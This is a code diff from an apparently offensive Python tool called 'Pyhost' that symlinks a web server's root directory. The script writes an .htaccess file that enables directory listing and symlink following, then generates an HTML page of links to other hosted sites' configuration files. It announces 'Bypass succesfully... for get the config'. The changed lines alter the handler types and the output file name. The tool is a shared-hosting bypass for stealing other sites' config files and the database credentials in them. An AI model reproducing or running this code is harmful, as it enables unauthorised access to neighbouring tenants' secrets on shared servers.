@@ -14,8 +14,8 @@ os.system("ln -s / pyhost")
 
 title = "<title>Pyhost | By: byt3_ver!fy</title><center><h1 style=color:grey;>Pyhost</h1><h2 " \
         "style=color:red;>By: byt3_ver!fy</h2><table> "
-htc = "Options Indexes FollowSymlinks\nDirectoryIndex pyhost.phtml\nAddType text/html .phtml " \
-      ".phtml\nAddHandler text/html .phtml "
+htc = "Options Indexes FollowSymlinks\nDirectoryIndex pyhost.phtml\nAddType txt .phtml " \
+      ".phtml\nAddHandler txt .phtml "
 
 m = open(".htaccess", "w+")
 m.write(htc)
@@ -67,6 +67,6 @@ for site in sites:
                       "href=pyhost.txt/%s.txt><button "
                       "style=background-color:#696969;border:#696969;color:green;>Symlink !</button></a></td>" % (
                           number, site, site))
-            print("[+] Bypass succesfully, access pyhost.html for get the config\n")
+            print("[+] Bypass succesfully, access pyhost.phtml for get the config\n")
         else:
             print("[-] Can't get a config :(\n")
